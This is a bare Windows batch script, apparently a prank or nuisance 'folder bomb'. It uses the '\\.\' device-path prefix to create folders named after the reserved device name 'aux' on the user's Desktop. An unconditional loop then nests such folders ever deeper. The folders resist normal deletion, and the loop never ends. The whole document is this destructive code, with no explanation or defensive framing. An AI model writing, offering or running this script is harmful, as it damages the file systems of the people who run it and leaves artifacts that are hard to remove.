
md\\.\\%userprofile%\\desktop\\aux\\
set "dirri=%userprofile%\\desktop\\aux\\"
:loop
md\\.\\%dirri%\\aux\\
set "dirri2=%dirri%\\aux\\"
md\\.\\%dirri2%\\aux\\
set "dirri=%dirri2%\\aux\\"
goto loop